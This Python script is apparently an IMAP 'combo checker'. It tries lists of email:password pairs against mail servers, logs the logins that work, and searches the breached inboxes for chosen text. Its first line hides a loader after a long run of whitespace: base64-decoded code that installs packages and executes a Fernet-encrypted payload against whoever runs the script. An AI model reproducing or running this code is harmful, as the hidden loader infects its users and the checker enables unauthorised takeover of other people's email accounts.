import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJzBpa3lTT3hkYUhFdzEza1BEOTZjZlpmY1NTeFdpd2pRVi1yYUpsZU9Cc2s9JykuZGVjcnlwdChiJ2dBQUFBQUJtOFoxb29WUllTTUVrWG5HWWlPUEN6RXFzSURHYnNrZXRkQ1pFaWxwTWtHSldpdXpQa2M1bDlkTjk0bnQ3c1AyMVMwQTZXUGpoWFNscU5WX0Rpc0xPcVpRWUpsNkl0SThMS2xmNmtfZHF6enhrVl96UElHZWJJZXNDQi1yb1pjZ3R1NlNoRHY3aGtJTjRmOUEwSEl2VmM4THBKWERDcG14azh1WXE0VzlfY3EzcXJxRmllMzdSdkU2NmhrRHQwSmlvUGpBckhlUWRfXzF2ZEV0TFB5aFJJdU5DeFNRZUZwaWFiekNjM29GMkJCUXdKUHc9Jykp').decode())
from imaplib import IMAP4_SSL as ssl_imap
from imaplib import IMAP4 as imap
import re
from multiprocessing.dummy import Pool as ThreadPool

a = input('Enter the full file name where your combos are: ')
b = input('Enter the text to search for in bodies: ')
threads = int(input('How many threads to use: '))

with open('hoster.dat') as f:
    lines = f.readlines()

with open(a) as f:
    combo = f.readlines()

def check(d):
    part1 = re.search('^.{1,64}@',d)
    part2 = re.search('@.{1,255}:',d)
    part3 = re.search(':.{1,}\n',d)
    part1 = part1.group(0)
    part2 = part2.group(0)
    part3 = part3.group(0)
    part2 = part2[1:-1]
    part3 = part3[1:-1]
    for line in lines:
        if part2 in line:
            part4 = re.search(':[a-zA-Z0-9.-]{1,255}:',line)
            part4 = part4.group(0)
            part4 = part4[1:-1]
            try:
                mail = ssl_imap(part4)
            except:
                try:
                    mail = imap(part4)
                except:
                    f = open('Invalid','a')
                    f.write(part1 + part2 + ':' + part3 + '\n')
                    f.close
                    return 'invalid'
            try:
                mail.login(part1 + part2, part3)
                f = open('Valid','a')
                f.write(part1 + part2 + ':' + part3 + '\n')
                f.close()
                mail.select('INBOX')
                results = mail.search(None, "(BODY " + b + ")")
                if '1' in str(results):
                    if 'NO' in str(results):
                        return 'no'
                    else:
                        print(part1 + part2 + ':' + part3)
                        f = open('Found','a')
                        f.write(part1 + part2 + ':' + part3 + '\n')
                        f.close
            except:
                f = open('Invalid','a')
                f.write(part1 + part2 + ':' + part3 + '\n')
                f.close
                return 'invalid'

pool = ThreadPool(threads)

pool.map(check, combo)

pool.close()
pool.join()

print()
print('Finished checking')
input('Press enter to exit')
exit
print('zjhsfauhv')